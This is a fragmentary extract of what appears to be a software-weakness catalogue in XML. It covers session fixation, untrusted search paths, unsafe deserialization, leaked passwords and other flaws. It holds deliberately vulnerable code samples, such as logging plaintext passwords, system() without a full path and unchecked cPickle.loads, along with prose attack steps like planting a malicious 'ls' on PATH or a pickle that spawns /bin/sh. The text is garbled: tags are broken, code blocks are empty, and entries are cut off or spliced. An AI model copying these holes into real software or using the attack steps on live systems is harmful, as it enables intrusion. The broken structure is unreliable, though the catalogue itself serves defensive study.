            <xhtml:p>Security and privacy concerns often seem to compete with each other. From a security perspective, all important operations should be recorded so that any anomalous activity can later be identified. However, when private data is involved, this practice can in fact create risk. Although there are many ways in which private data can be handled unsafely, a common risk stems from misplaced trust. Programmers often trust the operating environment in which a program runs, and therefore believe that it is acceptable store private information on the file system, in the registry, or in other locally-controlled resources. However, even if access to certain resources is restricted, this does not guarantee that the individuals who do have access can be trusted.</xhtml:p>

            <Demonstrative_Example>
               <Intro_Text>In 2004, an employee at AOL sold approximately 92 million private customer e-mail addresses to a spammer marketing an offshore gambling web site [REF-338]. In response to such high-profile exploits, the collection and management of private data is becoming increasingly regulated.</Intro_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code contains a logging statement that tracks the contents of records added to a database by storing them in a log file. Among other values that are stored, the getPassword() function returns the user-supplied plaintext password associated with the account.</Intro_Text>
               <Example_Code Nature="bad" Language="C#">
                  <xhtml:div>pass = GetPassword();<xhtml:br/>...<xhtml:br/>dbmsLog.WriteLine(id + ":" + pass + ":" + type + ":" + tstamp);</xhtml:div>
               </Example_Code>
               <Body_Text>The code in the example above logs a plaintext password to the filesystem. Although many developers trust the filesystem as a safe storage location for data, it should not be trusted implicitly, particularly when privacy is a concern.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-111">
               <Intro_Text>This code uses location to determine the user's current US State location.</Intro_Text>
               <Body_Text>First the application must declare that it requires the ACCESS_FINE_LOCATION permission in the application's manifest.xml:</Body_Text>

                  <xhtml:div>&lt;uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>During execution, a call to getLastLocation() will return a location based on the application's location permissions. In this case the application has permission for the most accurate location possible:</Body_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>locationClient = new LocationClient(this, this, this);<xhtml:br/>locationClient.connect();<xhtml:br/>Location userCurrLocation;<xhtml:br/>userCurrLocation = locationClient.getLastLocation();<xhtml:br/>deriveStateFromCoords(userCurrLocation);</xhtml:div>
               </Example_Code>
               <Body_Text>While the application needs this information, it does not need to use the ACCESS_FINE_LOCATION permission, as the ACCESS_COARSE_LOCATION permission will be sufficient to identify which US state the user is in.</Body_Text>

      <Weakness ID="370" Name="Missing Check for Certificate Revocation after Initial Check" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>The software does not check the revocation status of a certificate after its initial revocation check, which can cause the software to perform privileged actions even after the certificate is revoked at a later time.</Description>
         <Extended_Description>If the revocation status of a certificate is not checked before each action that requires privileges, the system may be subject to a race condition. If a certificate is revoked after the initial check, all subsequent actions taken with the owner of the revoked certificate will lose all benefits guaranteed by the certificate. In fact, it is almost certain that the use of a revoked certificate indicates malicious activity.</Extended_Description>

      <Weakness ID="384" Name="Session Fixation" Abstraction="Compound" Structure="Composite" Status="Incomplete">
         <Description>Authenticating a user, or otherwise establishing a new user session, without invalidating any existing session identifier gives an attacker the opportunity to steal authenticated sessions.</Description>
         <Extended_Description>
            <xhtml:p>Such a scenario is commonly observed when:</xhtml:p>
            <xhtml:div style="margin-left:10px;">
               <xhtml:div>1. A web application authenticates a user without first invalidating the existing session, thereby continuing to use the session already associated with the user.</xhtml:div>
               <xhtml:div>2. An attacker is able to force a known session identifier on a user so that, once the user authenticates, the attacker has access to the authenticated session.</xhtml:div>
               <xhtml:div>3. The application or container uses predictable session identifiers. In the generic exploit of session fixation vulnerabilities, an attacker creates a new session on a web application and records the associated session identifier. The attacker then causes the victim to associate, and possibly authenticate, against the server using that session identifier, giving the attacker access to the user's account through the active session.</xhtml:div>

               <Description>For platforms such as ASP that do not generate new values for sessionid cookies, utilize a secondary cookie. In this approach, set a secondary cookie on the user's browser to a random value and set a session variable to the same value. If the session variable and the cookie value ever don't match, invalidate the session, and force the user to log on again.</Description>

         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following example shows a snippet of code from a J2EE web application where the application authenticates users with LoginContext.login() without first calling HttpSession.invalidate().</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>private void auth(LoginContext lc, HttpSession session) throws LoginException {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>...<xhtml:br/>lc.login();<xhtml:br/>...</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>}</xhtml:div>
               </Example_Code>
               <Body_Text>In order to exploit the code above, an attacker could first create a session (perhaps by logging into the application) from a public terminal, record the session identifier assigned by the application, and reset the browser to the login page. Next, a victim sits down at the same public terminal, notices the browser open to the login page of the site, and enters credentials to authenticate against the application. The code responsible for authenticating the victim continues to use the pre-existing session identifier, now the attacker simply uses the session identifier recorded earlier to access the victim's active session, providing nearly unrestricted access to the victim's account for the lifetime of the session. Even given a vulnerable application, the success of the specific attack described here is dependent on several factors working in the favor of the attacker: access to an unmonitored public terminal, the ability to keep the compromised session active and a victim interested in logging into the vulnerable application on the public terminal.</Body_Text>
               <Body_Text>In most circumstances, the first two challenges are surmountable given a sufficient investment of time. Finding a victim who is both using a public terminal and interested in logging into the vulnerable application is possible as well, so long as the site is reasonably popular. The less well known the site is, the lower the odds of an interested victim using the public terminal and the lower the chance of success for the attack vector described above. The biggest challenge an attacker faces in exploiting session fixation vulnerabilities is inducing victims to authenticate against the vulnerable application using a session identifier known to the attacker.</Body_Text>
               <Body_Text>In the example above, the attacker did this through a direct method that is not subtle and does not scale suitably for attacks involving less well-known web sites. However, do not be lulled into complacency; attackers have many tools in their belts that help bypass the limitations of this attack vector. The most common technique employed by attackers involves taking advantage of cross-site scripting or HTTP response splitting vulnerabilities in the target site [12]. By tricking the victim into submitting a malicious request to a vulnerable application that reflects JavaScript or other code back to the victim's browser, an attacker can create a cookie that will cause the victim to reuse a session identifier controlled by the attacker. It is worth noting that cookies are often tied to the top level domain associated with a given URL. If multiple applications reside on the same top level domain, such as bank.example.com and recipes.example.com, a vulnerability in one application can allow an attacker to set a cookie with a fixed session identifier that will be used in all interactions with any application on the domain example.com [29].</Body_Text>

            <Demonstrative_Example>
               <Intro_Text>The following example shows a snippet of code from a J2EE web application where the application authenticates users with a direct post to the &lt;code&gt;j_security_check&lt;/code&gt;, which typically does not invalidate the existing session before processing the login request.</Intro_Text>

         <Notes>
            <Note Type="Other">Other attack vectors include DNS poisoning and related network based attacks where an attacker causes the user to visit a malicious site by redirecting a request for a valid site. Network based attacks typically involve a physical presence on the victim's network or control of a compromised machine on the network, which makes them harder to exploit remotely, but their significance should not be overlooked. Less secure session management mechanisms, such as the default implementation in Apache Tomcat, allow session identifiers normally expected in a cookie to be specified on the URL as well, which enables an attacker to cause a victim to use a fixed session identifier simply by emailing a malicious URL.</Note>

               <Intro_Text>The following example attempts to allocate memory for a character. After the call to malloc, an if statement is used to check whether the malloc function failed.</Intro_Text>
               <Example_Code Nature="bad" Language="C">

               <Body_Text>The conditional successfully detects a NULL return value from malloc indicating a failure, however it does not do anything to handle the problem. Unhandled errors may have unexpected results and may cause the program to crash or terminate.</Body_Text>
               <Body_Text>Instead, the if block should contain statements that either attempt to fix the problem or notify the user that an error has occurred and continue processing or perform some cleanup and gracefully terminate the program.

            <Demonstrative_Example>
               <Intro_Text>In the following C++ example the method readFile() will read the file whose name is provided in the input parameter and will return the contents of the file in char string. The method calls open() and read() may result in errors if the file does not exist or does not contain any data to read. These errors will be thrown when the is_open() method and good() method indicate errors opening or reading the file. However, these errors are not handled within the catch statement. Catch statements that do not perform any processing will have unexpected results. In this case an empty char string will be returned, and the file will not be properly closed.</Intro_Text>

               <Body_Text>The catch statement should contain statements that either attempt to fix the problem or notify the user that an error has occurred and continue processing or perform some cleanup and gracefully terminate the program. The following C++ example contains two catch statements. The first of these will catch a specific error thrown within the try block, and the second catch statement will catch all other errors from within the catch block. Both catch statements will notify the user that an error has occurred, close the file, and rethrow to the block that called the readFile() method for further handling or possible termination of the program.</Body_Text>

               <Intro_Text>In the following Java example the method readFile will read the file whose name is provided in the input parameter and will return the contents of the file in a String object. The constructor of the FileReader object and the read method call may throw exceptions and therefore must be within a try/catch block. While the catch statement in this example will catch thrown exceptions in order for the method to compile, no processing is performed to handle the thrown exceptions. Catch statements that do not perform any processing will have unexpected results. In this case, this will result in the return of a null String.</Intro_Text>

               <Body_Text>The catch statement should contain statements that either attempt to fix the problem, notify the user that an exception has been raised and continue processing, or perform some cleanup and gracefully terminate the program. The following Java example contains three catch statements. The first of these will catch the FileNotFoundException that may be thrown by the FileReader constructor called within the try/catch block. The second catch statement will catch the IOException that may be thrown by the read method called within the try/catch block. The third catch statement will catch all other exceptions thrown within the try block. For all catch statements the user is notified that the exception has been thrown and the exception is rethrown to the block that called the readFile() method for further processing or possible termination of the program. Note that with Java it is usually good practice to use the getMessage() method of the exception class to provide more information to the user about the exception raised.</Body_Text>

      <Weakness ID="403" Name="Exposure of File Descriptor to Unintended Control Sphere ('File Descriptor Leak')" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>A process does not close sensitive file descriptors before invoking a child process, which allows the child to perform unauthorized I/O operations using those descriptors.</Description>
         <Extended_Description>When a new process is forked or executed, the child process inherits any open file descriptors. When the child process has fewer privileges than the parent process, this might introduce a vulnerability if the child process can access the file descriptor but does not have the privileges to access the associated file.</Extended_Description>

            <Note Type="Relationship">Overlaps Modification of Assumed-Immutable Data (MAID), authorization errors, container errors; often primary to other weaknesses such as XSS and SQL injection.</Note>
            <Note Type="Theoretical">"Forced browsing" is a step-based manipulation involving the omission of one or more steps, whose order is assumed to be immutable. The application does not verify that the first step was performed successfully before the second step. The consequence is typically "authentication bypass" or "path disclosure," although it can be primary to all kinds of weaknesses, especially in languages such as PHP, which allow external modification of assumed-immutable variables.</Note>

      <Weakness ID="426" Name="Untrusted Search Path" Abstraction="Compound" Structure="Composite" Status="Draft">
         <Description>The application searches for critical resources using an externally-supplied search path that can point to resources that are not under the application's direct control.</Description>
         <Extended_Description>
            <xhtml:p>This might allow attackers to execute their own programs, access unauthorized data files, or modify configuration in unexpected ways. If the application uses a search path to locate critical resources such as programs, then an attacker could modify that search path to point to a malicious program, which the targeted application would then execute. The problem extends to any type of critical resource that the application trusts.</xhtml:p>
            <xhtml:p>Some of the most common variants of untrusted search path are:</xhtml:p>
            <xhtml:div style="margin-left:10px;">
               <xhtml:ul>
                  <xhtml:li>In various UNIX and Linux-based systems, the PATH environment variable may be consulted to locate executable programs, and LD_PRELOAD may be used to locate a separate library.</xhtml:li>
                  <xhtml:li>In various Microsoft-based systems, the PATH environment variable is consulted to locate a DLL, if the DLL is not found in other paths that appear earlier in the search order.</xhtml:li>

               <Description>
                  <xhtml:p>Use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.</xhtml:p>
                  <xhtml:p>Attach the monitor to the process and look for library functions and system calls that suggest when a search path is being used. One pattern is when the program performs multiple accesses of the same file but in different directories, with repeated failures until the proper filename is found. Library calls such as getenv() or their equivalent can be checked to see if any path-related variables are being accessed.</xhtml:p>

               <Method>Automated Static Analysis</Method>
               <Description>Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible.</Description>

               <Method>Manual Analysis</Method>
               <Description>Use tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.</Description>

               <Description>When invoking other programs, specify those programs using fully-qualified pathnames. While this is an effective approach, code that uses fully-qualified pathnames might not be portable to other systems that do not use the same pathnames. The portability can be improved by locating the full-qualified paths in a centralized, easily-modifiable location within the source code, and having the code refer to these paths.</Description>

               <Description>Use other functions that require explicit paths. Making use of any of the other readily available functions that require explicit paths is a safe way to avoid this problem. For example, system() in C does not require a full path since the shell can take care of it, while execl() and execv() require a full path.</Description>

            <Demonstrative_Example Demonstrative_Example_ID="DX-67">
               <Intro_Text>This program is intended to execute a command that lists the contents of a restricted directory, then performs other actions. Assume that it runs with setuid privileges in order to bypass the permissions check by the operating system.</Intro_Text>
               <Example_Code Nature="bad" Language="C">
                  <xhtml:div>#define DIR "/restricted/directory"<xhtml:br/>
                     <xhtml:br/>char cmd[500];<xhtml:br/>sprintf(cmd, "ls -l %480s", DIR);<xhtml:div>
                        <xhtml:i>/* Raise privileges to those needed for accessing DIR. */</xhtml:i>
                     </xhtml:div>
                     <xhtml:br/>RaisePrivileges(...);<xhtml:br/>system(cmd);<xhtml:br/>DropPrivileges(...);<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>This code may look harmless at first, since both the directory and the command are set to fixed values that the attacker can't control. The attacker can only see the contents for DIR, which is the intended program behavior. Finally, the programmer is also careful to limit the code that executes with raised privileges.</Body_Text>
               <Body_Text>However, because the program does not modify the PATH environment variable, the following attack would work:</Body_Text>
               <Body_Text>
                  <xhtml:div>
                     <xhtml:div>The user sets the PATH to reference a directory under that user's control, such as "/my/dir/".</xhtml:div>
                     <xhtml:div>The user creates a malicious program called "ls", and puts that program in /my/dir</xhtml:div>
                     <xhtml:div>The user executes the program.</xhtml:div>
                     <xhtml:div>When system() is executed, the shell consults the PATH to find the ls program</xhtml:div>
                     <xhtml:div>The program finds the malicious program, "/my/dir/ls". It doesn't find "/bin/ls" because PATH does not contain "/bin/".</xhtml:div>
                     <xhtml:div>The program executes the malicious program with the raised privileges.</xhtml:div>
                  </xhtml:div>
               </Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-68">
               <Intro_Text>This code prints all of the running processes belonging to the current user.</Intro_Text>
               <Example_Code Nature="bad" Language="PHP">
                  <xhtml:div>

                        <xhtml:i>//assume getCurrentUser() returns a username that is guaranteed to be alphanumeric (CWE-78)</xhtml:i>

               </Example_Code>
               <Body_Text>This program is also vulnerable to a PATH based attack, as an attacker may be able to create malicious versions of the ps or grep commands. While the program does not explicitly raise privileges to run the system commands, the PHP interpreter may by default be running with higher privileges than users.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-29">
               <Intro_Text>The following code is from a web application that allows users access to an interface through which they can update their password on the system. In this environment, user passwords can be managed using the Network Information System (NIS), which is commonly used on UNIX systems. When performing NIS updates, part of the process for updating passwords is to run a make command in the /var/yp directory. Performing NIS updates requires extra privileges.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>...<xhtml:br/>System.Runtime.getRuntime().exec("make");<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The problem here is that the program does not specify an absolute path for make and does not clean its environment prior to executing the call to Runtime.exec(). If an attacker can modify the $PATH variable to point to a malicious binary called make and cause the program to be executed in their environment, then the malicious binary will be loaded instead of the one intended. Because of the nature of the application, it runs with the privileges necessary to perform system operations, which means the attacker's make will now be run with these privileges, possibly giving the attacker complete control of the system.</Body_Text>

               <Description>The "unrestricted file upload" term is used in vulnerability databases and elsewhere, but it is insufficiently precise. The phrase could be interpreted as the lack of restrictions on the size or number of uploaded files, which is a resource consumption issue.</Description>

               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>Arbitrary code execution is possible if an uploaded file is interpreted and executed as code by the recipient. This is especially true for .asp and .php extensions uploaded to web servers because these file types are often treated as automatically executable, even when file system permissions do not specify execution. For example, in Unix environments, programs typically cannot run unless the execute bit is set, but PHP programs may be executed by the web server without directly invoking them on the operating system.</Note>

               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
                  <xhtml:p>For example, limiting filenames to alphanumeric characters can help to restrict the introduction of unintended file extensions.</xhtml:p>

If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.</Description>

               <Description>
                  <xhtml:p>Run the code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.</xhtml:p>
                  <xhtml:p>OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.</xhtml:p>
                  <xhtml:p>This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.</xhtml:p>
                  <xhtml:p>Be careful to avoid CWE-243 and other weaknesses related to jails.</xhtml:p>

               <Effectiveness_Notes>The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed.</Effectiveness_Notes>

      </Weakness>
      <Weakness ID="441" Name="Unintended Proxy or Intermediary ('Confused Deputy')" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The software receives a request, message, or directive from an upstream component, but the software does not sufficiently preserve the original source of the request before forwarding the request to an external actor that is outside of the software's control sphere. This causes the software to appear to be the source of the request, leading it to act as a proxy or other intermediary between the upstream component and the external actor.</Description>
         <Extended_Description>
            <xhtml:p>If an attacker cannot directly contact a target, but the software has access to the target, then the attacker can send a request to the software and have it be forwarded from the target. The request would appear to be coming from the software's system, not the attacker's system. As a result, the attacker can bypass access controls (such as firewalls) or hide the source of malicious requests, since the requests would not be coming directly from the attacker.</xhtml:p>
            <xhtml:p>Since proxy functionality and message-forwarding often serve a legitimate purpose, this issue only becomes a vulnerability when:</xhtml:p>
            <xhtml:div style="margin-left:10px;">
               <xhtml:ul>
                  <xhtml:li>The software runs with different privileges or on a different system, or otherwise has different levels of access than the upstream component;</xhtml:li>
                  <xhtml:li>The attacker is prevented from making the request directly to the target; and</xhtml:li>
                  <xhtml:li>The attacker can create a request that the proxy does not explicitly intend to be forwarded on the behalf of the requester. Such a request might point to an unexpected hostname, port number, or service. Or, the request might be sent to an allowed service, but the request could contain disallowed directives, commands, or resources.</xhtml:li>

         <Notes>
            <Note Type="Relationship">This weakness has a chaining relationship with CWE-668 (Exposure of Resource to Wrong Sphere) because the proxy effectively provides the attacker with access to the target's resources that the attacker cannot directly obtain.</Note>
            <Note Type="Maintenance">This could possibly be considered as an emergent resource.</Note>
            <Note Type="Theoretical">It could be argued that the "confused deputy" is a fundamental aspect of most vulnerabilities that require an active attacker. Even for common implementation issues such as buffer overflows, SQL injection, OS command injection, and path traversal, the vulnerable program already has the authorization to run code or access files. The vulnerability arises when the attacker causes the program to run unexpected code or access unexpected files.</Note>

         <Description>The product does not clean up its state or incorrectly cleans up its state when an exception is thrown, leading to unexpected state or control flow.</Description>
         <Extended_Description>Often, when functions or loops become complicated, some level of resource cleanup is needed throughout execution. Exceptions can disturb the flow of the code and prevent the necessary cleanup from happening.</Extended_Description>

      </Weakness>
      <Weakness ID="472" Name="External Control of Assumed-Immutable Web Parameter" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The web application does not sufficiently verify inputs that are assumed to be immutable but are actually externally controllable, such as hidden form fields.</Description>
         <Extended_Description>
            <xhtml:p>If a web product does not properly protect assumed-immutable values from modification in hidden form fields, parameters, cookies, or URLs, this can lead to modification of critical data. Web applications often mistakenly make the assumption that data passed to the client in hidden fields or cookies is not susceptible to tampering. Improper validation of data that are user-controllable can lead to the application processing incorrect, and often malicious, input.</xhtml:p>
            <xhtml:p>For example, custom cookies commonly store session data or persistent data across sessions. This kind of session data is normally involved in security related decisions on the server side, such as user authentication and access control. Thus, the cookies might contain sensitive data such as user credentials and privileges. This is a dangerous practice, as it can often lead to improper reliance on the value of the client-provided cookie by the server side application.</xhtml:p>

               <Note>Without appropriate protection mechanisms, the client can easily tamper with cookies and similar web data. Reliance on the cookies without detailed validation can lead to problems such as SQL injection. If you use cookie values for security related decisions on the server side, manipulating the cookies might lead to violations of security policies such as authentication bypassing, user impersonation and privilege escalation. In addition, storing sensitive data in the cookie without appropriate protection can also lead to disclosure of sensitive user data, especially data stored in persistent cookies.</Note>

               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>

               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.</Description>

            <Demonstrative_Example>
               <Intro_Text>In this example, a web application uses the value of a hidden form field (accountID) without having done any input validation because it was assumed to be immutable.</Intro_Text>

               <Intro_Text>Hidden fields should not be trusted as secure parameters.</Intro_Text>
               <Body_Text>An attacker can intercept and alter hidden fields in a post to the server as easily as user input fields. An attacker can simply parse the HTML for the substring:</Body_Text>

               <Description>Carefully identify which variables can be controlled or influenced by an external user, and consider adopting a naming convention to emphasize when externally modifiable variables are being used. An application should be reluctant to trust variables that have been initialized outside of its trust boundary. Ensure adequate checking is performed when relying on input from outside a trust boundary. Do not allow your application to run with register_globals enabled. If you implement a register_globals emulator, be extremely careful of variable extraction, dynamic evaluation, and similar issues, since weaknesses in your emulation could allow external variable modification to take place even without register_globals.</Description>

      <Weakness ID="488" Name="Exposure of Data Element to Wrong Session" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>The product does not sufficiently enforce boundaries between the states of different sessions, causing data to be provided to, or used by, the wrong session.</Description>
         <Extended_Description>
            <xhtml:p>Data can "bleed" from one session to another through member variables of singleton objects, such as Servlets, and objects from a shared pool.</xhtml:p>
            <xhtml:p>In the case of Servlets, developers sometimes do not understand that, unless a Servlet implements the SingleThreadModel interface, the Servlet is a singleton; there is only one instance of the Servlet, and that single instance is used and re-used to handle multiple requests that are processed simultaneously by different threads. A common result is that developers use Servlet member fields in such a way that one user may inadvertently see another user's data. In other words, storing user data in Servlet member fields introduces a data access race condition.</xhtml:p>

Thread 2: print "Jane, thanks for visiting!" Thereby showing the first user the second user's name.</Body_Text>

                  <xhtml:p>Use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.</xhtml:p>
                  <xhtml:p>Attach the monitor to the process and also sniff the network connection. Trigger features related to product updates or plugin installation, which is likely to force a code download. Monitor when files are downloaded and separately executed, or if they are otherwise read back into the process. Look for evidence of cryptographic library calls that use integrity checking.</xhtml:p>

                  <xhtml:p>This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.</xhtml:p>

               <Effectiveness_Notes>The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed.</Effectiveness_Notes>

               <Body_Text>This code does not verify that the external domain accessed is the intended one. An attacker may somehow cause the external domain name to resolve to an attack server, which would provide the information for a false database. The attacker may then steal the usernames and encrypted passwords from real user login attempts, or simply allow himself to access the application without a real user account.</Body_Text>
               <Body_Text>This example is also vulnerable to a Man in the Middle (CWE-300) attack.</Body_Text>

            <Note Type="Research Gap">This is critical for mobile code, but it is likely to become more and more common as developers continue to adopt automated, network-based product distributions and upgrades. Software-as-a-Service (SaaS) might introduce additional subtleties. Common exploitation scenarios may include ad server compromises and bad upgrades.</Note>

      <Weakness ID="502" Name="Deserialization of Untrusted Data" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>The application deserializes untrusted data without sufficiently verifying that the resulting data will be valid.</Description>
         <Extended_Description>
            <xhtml:p>It is often convenient to serialize objects for communication or to save them for later use. However, deserialized data or code can often be modified without using the provided accessor functions if it does not use cryptography to protect itself. Furthermore, any cryptography would still be client-side security -- which is a dangerous security assumption.</xhtml:p>
            <xhtml:p>Data that is untrusted can not be trusted to be well-formed.</xhtml:p>
            <xhtml:p>When developers place no restrictions on "gadget chains," or series of instances and method invocations that can self-execute during the deserialization process (i.e., before the object is returned to the caller), it is sometimes possible for attackers to leverage them to perform unauthorized actions, like generating a shell.</xhtml:p>

               <Description>If available, use the signing/sealing features of the programming language to assure that deserialized data has not been tainted. For example, a hash-based message authentication code (HMAC) could be used to ensure that data has not been modified.</Description>

               <Example_Code Nature="good" Language="Java">
                  <xhtml:div>private final void readObject(ObjectInputStream in) throws java.io.IOException {<xhtml:br/>throw new java.io.IOException("Cannot be deserialized"); }</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>In Python, the Pickle library handles the serialization and deserialization processes. In this example derived from [R.502.7], the code receives and parses data, and afterwards tries to authenticate a user based on validating a token.</Intro_Text>
               <Example_Code Nature="bad" Language="Python">
                  <xhtml:div>try {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>class ExampleProtocol(protocol.Protocol):<xhtml:br/>def dataReceived(self, data):<xhtml:br/>
                           <xhtml:br/># Code that would be here would parse the incoming data<xhtml:br/># After receiving headers, call confirmAuth() to authenticate<xhtml:br/>
                           <xhtml:br/>def confirmAuth(self, headers):<xhtml:br/>try:<xhtml:br/>token = cPickle.loads(base64.b64decode(headers['AuthToken']))<xhtml:br/>if not check_hmac(token['signature'], token['data'], getSecretKey()):<xhtml:br/>raise AuthFail<xhtml:br/>self.secure_data = token['data']<xhtml:br/>except:<xhtml:br/>raise AuthFail</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>}</xhtml:div>
               </Example_Code>
               <Body_Text>Unfortunately, the code does not verify that the incoming data is legitimate. An attacker can construct a illegitimate, serialized object "AuthToken" that instantiates one of Python's subprocesses to execute arbitrary commands. For instance,the attacker could construct a pickle that leverages Python's subprocess module, which spawns new processes and includes a number of arguments for various uses. Since Pickle allows objects to define the process for how they should be unpickled, the attacker can direct the unpickle process to call Popen in the subprocess module and execute /bin/sh.</Body_Text>

               <Description>Enforce SSL use for the login page or any page used to transmit user credentials or other sensitive information. Even if the entire site does not use SSL, it MUST use SSL for login. Additionally, to help prevent phishing attacks, make sure that SSL serves the login page. SSL allows the user to verify the identity of the server to which they are connecting. If the SSL serves login page, the user can be certain they are talking to the proper end system. A phishing attack would typically redirect a user to a site that does not have a valid trusted server certificate issued from an authorized supplier.</Description>

         <Description>A backup file is stored in a directory that is accessible to actors outside of the intended control sphere.</Description>
         <Extended_Description>Often, old files are renamed with an extension such as .~bk to distinguish them from production files. The source code for old files that have been renamed in this manner and left in the webroot can often be retrieved. This renaming may have been performed automatically by the web server, or manually by the administrator.</Extended_Description>

         <Notes>
            <Note Type="Maintenance">Depending on usage, this could be a weakness or a category. Further study of all its children is needed, and the entire sub-tree may need to be clarified. The current organization is based primarily on the exposure of sensitive information as a consequence, instead of as a primary weakness.</Note>
            <Note Type="Maintenance">There is a close relationship with CWE-552, which is more focused on weaknesses. As a result, it may be more appropriate to convert CWE-538 to a category.</Note>

               <Description>URL Inputs should be decoded and canonicalized to the application's current internal representation before being validated and processed for authorization. Make sure that your application does not decode the same input twice. Such errors could be used to bypass whitelist schemes by introducing dangerous inputs after they have been checked.</Description>

         <Description>The application relies on the existence or values of cookies when performing security-critical operations, but it does not properly ensure that the setting is valid for the associated user.</Description>
         <Extended_Description>Attackers can easily modify cookies, within the browser or by implementing the client-side code outside of the browser. Reliance on cookies without detailed validation and integrity checking can allow attackers to bypass authentication, conduct injection attacks such as SQL injection and cross-site scripting, or otherwise modify inputs in unexpected ways.</Extended_Description>

               <Phase>Architecture and Design</Phase>
               <Description>Protect critical cookies from replay attacks, since cross-site scripting or other attacks may allow attackers to steal a strongly-encrypted cookie that also passes integrity checks. This mitigation applies to cookies that should only be valid during a single transaction or session. By enforcing timeouts, you may limit the scope of an attack. As part of your integrity check, use an unpredictable, server-side value that is not exposed to the client.</Description>

A developer may perform proper validation against URL parameters while assuming that attackers cannot modify cookies. As a result, the program might skip basic input validation to enable cross-site scripting, SQL injection, price tampering, and other attacks..</Note>

